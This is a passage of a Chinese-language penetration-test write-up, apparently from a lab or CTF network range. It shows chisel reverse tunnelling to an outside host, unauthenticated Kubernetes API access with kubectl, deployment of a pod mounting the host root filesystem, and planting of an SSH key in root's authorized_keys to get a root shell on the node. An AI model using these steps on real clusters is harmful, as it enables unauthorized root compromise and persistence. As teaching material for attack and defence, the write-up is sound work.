<div class="theme-admonition theme-admonition-warning admonition_xJq3 alert alert--warning"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 16 16"><path fill-rule="evenodd" d="M8.893 1.5c-.183-.31-.52-.5-.887-.5s-.703.19-.886.5L.138 13.499a.98.98 0 0 0 0 1.001c.193.31.53.501.886.501h13.964c.367 0 .704-.19.877-.5a1.03 1.03 0 0 0 .01-1.002L8.893 1.5zm.133 11.497H6.987v-2.003h2.039v2.003zm0-3.004H6.987V5.987h2.039v4.006z"></path></svg></span>注意</div><div class="admonitionContent_BuS1"><p>需要注意的是，由于 <code>kubectl</code> 自行设计了网络交互的逻辑，所以没办法由 <code>proxychains</code> 注入来实现代理，所以比较熬好的方案就是使用端口转发将 Kubernetes 端口转发出来</p></div></div>
<p>首先先转发服务</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">172.22.14.6</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">remote</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> www-data@ubuntu-oa:/tmp$ ./chisel_1.9.1_linux_amd64 client </span><span class="token number" style="color:#36acaa">172.28</span><span class="token plain">.23.17:1337 R:0.0.0.0:10003:172.22.14.37:6443</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">2024</span><span class="token plain">/08/16 </span><span class="token number" style="color:#36acaa">16</span><span class="token plain">:25:08 client: Connecting to ws://172.28.23.17:1337</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">2024</span><span class="token plain">/08/16 </span><span class="token number" style="color:#36acaa">16</span><span class="token plain">:25:08 server: session</span><span class="token comment" style="color:#999988;font-style:italic">#16: tun: proxy#R:10003=&gt;172.22.14.37:6443: Listening</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">2024</span><span class="token plain">/08/16 </span><span class="token number" style="color:#36acaa">16</span><span class="token plain">:25:08 client: Connected </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">Latency </span><span class="token number" style="color:#36acaa">48</span><span class="token plain">.219025ms</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>然后尝试连接 Kubernetes 服务</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">┌──</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">randark ㉿ kali</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">-</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">~/tools</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">└─$ ./kubectl --insecure-skip-tls-verify </span><span class="token parameter variable" style="color:#36acaa">-s</span><span class="token plain"> https://139.*.*.*:10003/ get pods</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Please enter Username: a</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Please enter Password: NAME                                READY   STATUS    RESTARTS   AGE</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nginx-deployment-58d48b746d-d6x8t   </span><span class="token number" style="color:#36acaa">1</span><span class="token plain">/1     Running   </span><span class="token number" style="color:#36acaa">3</span><span class="token plain">          314d</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nginx-deployment-58d48b746d-pg4gl   </span><span class="token number" style="color:#36acaa">1</span><span class="token plain">/1     Running   </span><span class="token number" style="color:#36acaa">3</span><span class="token plain">          314d</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nginx-deployment-58d48b746d-s2vwl   </span><span class="token number" style="color:#36acaa">1</span><span class="token plain">/1     Running   </span><span class="token number" style="color:#36acaa">3</span><span class="token plain">          314d</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nginx-deployment-58d48b746d-x26mr   </span><span class="token number" style="color:#36acaa">1</span><span class="token plain">/1     Running   </span><span class="token number" style="color:#36acaa">3</span><span class="token plain">          314d</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>查看 pod 资源</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">┌──</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">randark ㉿ kali</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">-</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">~/tools</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">└─$ ./kubectl --insecure-skip-tls-verify </span><span class="token parameter variable" style="color:#36acaa">-s</span><span class="token plain"> https://139.*.*.*:10003/ describe pod nginx-deployment-58d48b746d-d6x8t</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Please enter Username: a</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Please enter Password: Name:             nginx-deployment-58d48b746d-d6x8t</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Namespace:        default</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Priority:         </span><span class="token number" style="color:#36acaa">0</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Service Account:  default</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Node:             ubuntu-k8s/172.22.14.37</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Start Time:       Fri, 06 Oct </span><span class="token number" style="color:#36acaa">2023</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">20</span><span class="token plain">:33:56 +0800</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Labels:           </span><span class="token assign-left variable" style="color:#36acaa">app</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">nginx</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                  pod-template-hash</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">58d48b746d</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Annotations:      </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain">none</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Status:           Running</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">IP:               </span><span class="token number" style="color:#36acaa">10.244</span><span class="token plain">.0.36</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">IPs:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  IP:           </span><span class="token number" style="color:#36acaa">10.244</span><span class="token plain">.0.36</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Controlled By:  ReplicaSet/nginx-deployment-58d48b746d</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Containers:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  nginx:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Container ID:   docker://f7dfc9dc10e1efb17150bffcf6c32214cfbe3d360b938ae3ca3252e43b00dced</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Image:          nginx:1.8</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Image ID:       docker-pullable://nginx@sha256:c97ee70c4048fe79765f7c2ec0931957c2898f47400128f4f3640d0ae5d60d10</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Port:           </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain">none</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Host Port:      </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain">none</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    State:          Running</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      Started:      Fri, </span><span class="token number" style="color:#36acaa">16</span><span class="token plain"> Aug </span><span class="token number" style="color:#36acaa">2024</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">13</span><span class="token plain">:57:28 +0800</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Last State:     Terminated</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      Reason:       Completed</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      Exit Code:    </span><span class="token number" style="color:#36acaa">0</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      Started:      Mon, </span><span class="token number" style="color:#36acaa">25</span><span class="token plain"> Mar </span><span class="token number" style="color:#36acaa">2024</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">16</span><span class="token plain">:55:49 +0800</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      Finished:     Fri, </span><span class="token number" style="color:#36acaa">16</span><span class="token plain"> Aug </span><span class="token number" style="color:#36acaa">2024</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">13</span><span class="token plain">:56:04 +0800</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Ready:          True</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Restart Count:  </span><span class="token number" style="color:#36acaa">3</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Environment:    </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain">none</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Mounts:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      /var/run/secrets/kubernetes.io/serviceaccount from default-token-zqldf </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">ro</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Conditions:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  Type              Status</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  Initialized       True</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  Ready             True</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  ContainersReady   True</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  PodScheduled      True</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Volumes:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  default-token-zqldf:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Type:        Secret </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">a volume populated by a Secret</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    SecretName:  default-token-zqldf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Optional:    </span><span class="token boolean" style="color:#36acaa">false</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">QoS Class:       BestEffort</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Node-Selectors:  </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain">none</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Tolerations:     node.kubernetes.io/not-ready:NoExecute </span><span class="token assign-left variable" style="color:#36acaa">op</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">Exists </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> 300s</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                 node.kubernetes.io/unreachable:NoExecute </span><span class="token assign-left variable" style="color:#36acaa">op</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">Exists </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> 300s</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Events:          </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain">none</span><span class="token operator" style="color:#393A34">&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>于是，可以  尝试编写一个 pod，将宿主机的根目录映射进去之后，指定 ssh 私钥并连接，即可对宿主机实现 getshell</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">┌──</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">randark ㉿ kali</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">-</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">~/tmp</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">└─$ </span><span class="token function" style="color:#d73a49">cat</span><span class="token plain"> test.yaml</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">apiVersion: v1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">kind: Pod</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">metadata:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  name: nginx-deployment</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">spec:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  containers:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  - image: nginx:1.8</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    name: container</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    volumeMounts:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    - mountPath: /mnt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      name: </span><span class="token builtin class-name">test</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  volumes:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  - name: </span><span class="token builtin class-name">test</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    hostPath:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      path: /</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">┌──</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">randark ㉿ kali</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">-</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">~/tmp</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">└─$ ./kubectl --insecure-skip-tls-verify </span><span class="token parameter variable" style="color:#36acaa">-s</span><span class="token plain"> https://139.*.*.*:10003/ apply </span><span class="token parameter variable" style="color:#36acaa">-f</span><span class="token plain"> test.yaml</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-bash: ./kubectl: No such </span><span class="token function" style="color:#d73a49">file</span><span class="token plain"> or directory</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">┌──</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">randark ㉿ kali</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">-</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">~/tmp</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">└─$ ~/tools/kubectl --insecure-skip-tls-verify </span><span class="token parameter variable" style="color:#36acaa">-s</span><span class="token plain"> https://139.*.*.*:10003/ apply </span><span class="token parameter variable" style="color:#36acaa">-f</span><span class="token plain"> test.yaml</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Please enter Username: a</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Please enter Password:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">pod/nginx-deployment created</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">┌──</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">randark ㉿ kali</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">-</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">~/tmp</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">└─$ ~/tools/kubectl --insecure-skip-tls-verify </span><span class="token parameter variable" style="color:#36acaa">-s</span><span class="token plain"> https://139.*.*.*:10003/ get pods</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Please enter Username: a</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Please enter Password:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">NAME                                READY   STATUS                 RESTARTS   AGE</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nginx-deployment                    </span><span class="token number" style="color:#36acaa">1</span><span class="token plain">/1     Running                </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">          7s</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nginx-deployment-58d48b746d-d6x8t   </span><span class="token number" style="color:#36acaa">1</span><span class="token plain">/1     Running                </span><span class="token number" style="color:#36acaa">3</span><span class="token plain">          314d</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nginx-deployment-58d48b746d-pg4gl   </span><span class="token number" style="color:#36acaa">1</span><span class="token plain">/1     Running                </span><span class="token number" style="color:#36acaa">3</span><span class="token plain">          314d</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nginx-deployment-58d48b746d-s2vwl   </span><span class="token number" style="color:#36acaa">1</span><span class="token plain">/1     Running                </span><span class="token number" style="color:#36acaa">3</span><span class="token plain">          314d</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nginx-deployment-58d48b746d-x26mr   </span><span class="token number" style="color:#36acaa">1</span><span class="token plain">/1     Running                </span><span class="token number" style="color:#36acaa">3</span><span class="token plain">          314d</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>pod 成功部署之后，就可以开始写入 SSH 私钥</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">┌──</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">randark ㉿ kali</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">-</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">~/tmp</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">└─$ ~/tools/kubectl --insecure-skip-tls-verify </span><span class="token parameter variable" style="color:#36acaa">-s</span><span class="token plain"> https://139.*.*.*:10003/ </span><span class="token builtin class-name">exec</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-it</span><span class="token plain"> nginx-deployment -- /bin/bash</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Please enter Username: a</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Please enter Password:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">root@nginx-deployment-1:/</span><span class="token comment" style="color:#999988;font-style:italic"># whoami</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">root</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">root@nginx-deployment-1:/</span><span class="token comment" style="color:#999988;font-style:italic"># echo &quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCvIVUtOgQh3gYfAXyDcjh3hrXoqyNsV5EKH+LWRDTupdISFx64HX+QG/pvM0fTF9RnAwbZEVL7MzO1bHw+9yLeAHjLgxXQP+e3cHkhnX/5Qkt+6TF3woTI/3zFt/E1sArvs5bRyR028huFN5kyjwPBnedrbgM+gHI2XcYj/Rih53EwpaUIF5AW0RzWuHzvwz385FOZ5M1uplTORyjI3M0YmXQkZhn9b/43SH7SiwzAOXdincKYD0k9J7kmtQlqcY3/gWeUXLZVvj3N5rxg2Q9NSFq0ISSR1DR8baymN+877cuAXufTdDhlbaU8qX1ZNYRC2Pbc4qGlwvB0wfsfT32yJyo82YEFVkOd+z1Nj1GmgSro91EaPFckCVckAgslwc8e6JXTq598yzWck2fiSR9HJ1BQ60Dfog+wSBGozJUDmn+T39OaQKrlADEI6belRTrEdDVriMXia4lHtdT/mdtSHAjvWswy4CfX55fNH5PUKVlt5Q8s6qS3+/ZZuNkBGZU= randark@kali&quot; &gt; /mnt/root/.ssh/authorized_keys</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">root@nginx-deployment-1:/</span><span class="token comment" style="color:#999988;font-style:italic"># exit</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin class-name">exit</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>然后就可以尝试连接宿主机了</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">┌──</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">randark ㉿ kali</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">-</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">~/tmp</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">└─$ proxychains4 </span><span class="token parameter variable" style="color:#36acaa">-q</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">ssh</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-i</span><span class="token plain"> id_rsa root@172.22.14.37</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Welcome to Ubuntu </span><span class="token number" style="color:#36acaa">18.04</span><span class="token plain">.6 LTS </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">GNU/Linux </span><span class="token number" style="color:#36acaa">4.15</span><span class="token plain">.0-213-generic x86_64</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> * Documentation:  https://help.ubuntu.com</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> * Management:     https://landscape.canonical.com</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> * Support:        https://ubuntu.com/advantage</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Welcome to Alibaba Cloud Elastic Compute Service </span><span class="token operator" style="color:#393A34">!</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Last login: Fri Aug </span><span class="token number" style="color:#36acaa">16</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">16</span><span class="token plain">:37:43 </span><span class="token number" style="color:#36acaa">2024</span><span class="token plain"> from </span><span class="token number" style="color:#36acaa">172.22</span><span class="token plain">.14.6</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">root@ubuntu-k8s:~</span><span class="token comment" style="color:#999988;font-style:italic"># whoami</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">root</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="172221437-mysql-历史记录">172.22.14.37 Mysql 历史记录<a href="#172221437-mysql-历史记录" class="hash-link" aria-label="172.22.14.37 Mysql 历史记录的直接链接" title="172.22.14.37 Mysql 历史记录的直接链接">​</a></h2>
<p>发现 <code>/root</code> 目录下存在有 <code>.mysql_history</code> 文件，查看 mysql 历史记录</p>
